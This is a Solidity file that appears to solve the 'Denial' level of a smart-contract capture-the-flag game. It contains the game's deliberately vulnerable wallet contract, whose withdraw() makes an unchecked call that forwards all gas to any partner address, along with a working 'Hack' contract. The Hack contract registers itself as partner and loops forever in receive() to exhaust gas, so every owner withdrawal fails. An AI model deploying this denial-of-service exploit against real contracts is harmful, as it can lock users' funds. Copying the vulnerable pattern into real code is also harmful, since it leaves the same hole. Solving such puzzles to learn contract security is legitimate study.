

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
This is a simple wallet that drips funds over time. 
You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw()
 (whilst the contract still has funds, and the transaction is of 1M gas or less) 
 you will win this level.
**/
contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = payable(address(0xA9E));
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

interface DenialI {
  function setWithdrawPartner(address _partner) external;
  function withdraw() external;
}

contract Hack {
  DenialI denial;
  constructor(address _add) {
    denial = DenialI(_add);
  }

  function hack() public {
    denial.setWithdrawPartner(address(this));
  }

  function test() public  {
    denial.withdraw(); // should always fail, once the hack is called
  }

  receive() external payable {
    // Doing some expensive operation or a simple never ending loop to go out of gas
    while(true){
            
    }
  }
}

